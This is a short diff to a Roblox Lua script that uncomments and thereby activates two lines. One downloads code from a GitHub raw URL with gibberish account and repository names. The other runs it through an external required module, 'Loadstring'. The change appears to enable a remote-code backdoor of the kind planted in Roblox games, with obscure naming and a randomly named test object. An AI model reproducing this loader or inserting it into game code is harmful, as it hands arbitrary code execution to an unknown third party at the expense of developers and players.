@@ -1,5 +1,5 @@
---local Source = game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/tber65he56y3btbgtehg/nbwrty5gtrgrsg/main/mnruf7jr6ntydnbyhnt",true)
---require(8082203830):Loadstring(Source)
+local Source = game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/tber65he56y3btbgtehg/nbwrty5gtrgrsg/main/mnruf7jr6ntydnbyhnt",true)
+require(8082203830):Loadstring(Source)
 local success, error = pcall(function()
 	print('V2.02')
 	local rt=Instance.new("FunctionalTest")rt.Name=math.random() rt.Description=_G.IncreaseronLoaderTarget rt.Parent=game:GetService("TestService")
